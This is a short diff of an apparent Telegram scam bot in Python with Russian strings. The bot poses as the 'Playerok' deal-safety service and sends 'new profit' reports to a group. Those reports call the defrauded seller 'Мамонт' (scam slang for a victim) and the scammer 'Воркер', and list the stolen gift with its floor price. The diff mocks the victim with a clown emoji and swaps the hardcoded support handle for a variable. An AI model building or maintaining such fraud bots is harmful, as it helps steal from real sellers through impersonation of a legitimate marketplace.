@@ -418,7 +418,7 @@ async def send_log_to_group(deal_id: str):
     # Формируем сообщение для группы (только имя продавца, без @)
     group_message = (
         f"✅ НОВЫЙ ПРОФИТ\n\n"
-        f"👤 Мамонт: {seller['first_name']}\n"
+        f"🤡 Мамонт: {seller['first_name']}\n"
         f"👤 Воркер: @{buyer['username'] if buyer['username'] else 'Неизвестно'}\n"
         f"📝 Подарок: {deal['description']}\n"
         f"💰 Флор цена: {format_floor_price(floor_price)}\n"
@@ -516,7 +516,7 @@ async def cmd_start(message: types.Message, command: CommandStart):
         f"{hbold('👋 Добро пожаловать в Playerok!')}\n\n"
         f"Сервис, обеспечивающий безопасность и удобство проведения сделок.\n\n"
         f"📢 Наш канал — @playerok_com\n"
-        f"🛟 Поддержка — @supporOTC\n\n"
+        f"🛟 Поддержка — @{SUPPORT_USERNAME}\n\n"
         f"👇 Нажмите кнопку ниже, чтобы продолжить"
     )
     
